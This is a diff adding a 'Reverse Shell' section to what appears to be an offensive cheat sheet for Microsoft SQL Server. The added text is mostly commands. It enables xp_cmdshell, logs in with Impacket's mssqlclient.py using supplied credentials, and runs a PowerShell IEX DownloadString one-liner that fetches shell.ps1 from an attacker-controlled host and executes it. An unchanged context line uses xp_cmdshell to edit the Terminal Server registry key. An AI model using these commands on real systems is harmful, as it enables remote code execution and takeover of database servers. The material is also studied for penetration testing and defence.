@@ -69,3 +69,22 @@ xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Termin
 go
 ```
 
+## Reverse Shell
+
+```
+xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$IP/shell.ps1") | powershell -noprofile'
+```
+
+`mssqlclient.py` from **Impacket**
+
+```bash
+mssqlclient.py $DOMAIN/$USERNAME:$PASSWORD@$IP
+```
+
+Reverse shell (PowerShell example):
+
+```
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami /all
+SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$IP/shell.ps1") | powershell -noprofile'
+```
